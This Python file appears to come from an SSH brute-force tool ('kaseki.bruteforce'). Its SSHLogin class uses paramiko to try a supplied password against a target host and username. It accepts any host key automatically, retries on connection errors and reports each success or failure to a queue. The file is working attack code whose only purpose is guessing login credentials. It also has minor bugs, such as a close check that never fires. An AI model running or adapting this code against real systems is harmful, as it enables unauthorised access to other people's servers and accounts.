import paramiko
from typing import Union, Optional
import multiprocessing as mp
import queue as q

from kaseki.bruteforce.target import SSHTarget,Target
from kaseki.utils.queuecontent import Signal, QueueData

class SSHLogin:
    
    def __init__(self, target: Target, password: str, results_queue: Union[q.Queue, mp.Queue], max_attempts: int=100):
        self.target = target
        self.password = password
        self.results_queue = results_queue
        self.max_attempts = max_attempts
        self.client = paramiko.SSHClient()
        self.stop_flag = False

    def start(self) -> None:

        attempts = 0
        result = QueueData(Signal.Blank, None)
        
        while not self.stop_flag:
            try:
                self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                self.client.connect(
                    hostname=self.target.hostname,
                    port=self.target.port,
                    username=self.target.username,
                    password=self.password,
                    timeout=10
                )
                result = QueueData(Signal.Success, self.password)
                break
            except paramiko.ssh_exception.AuthenticationException:
                result = QueueData(Signal.Failed, self.password)
                break
            except paramiko.ssh_exception.SSHException:
                attempts += 1
                if attempts >= self.max_attempts:
                    result = QueueData(Signal.Retry, self.password)
                    break            
            finally:
                if 'client' in locals():
                    self.client.close()
                self.results_queue.put(result)
                
    def stop(self) -> None:
        self.stop_flag = True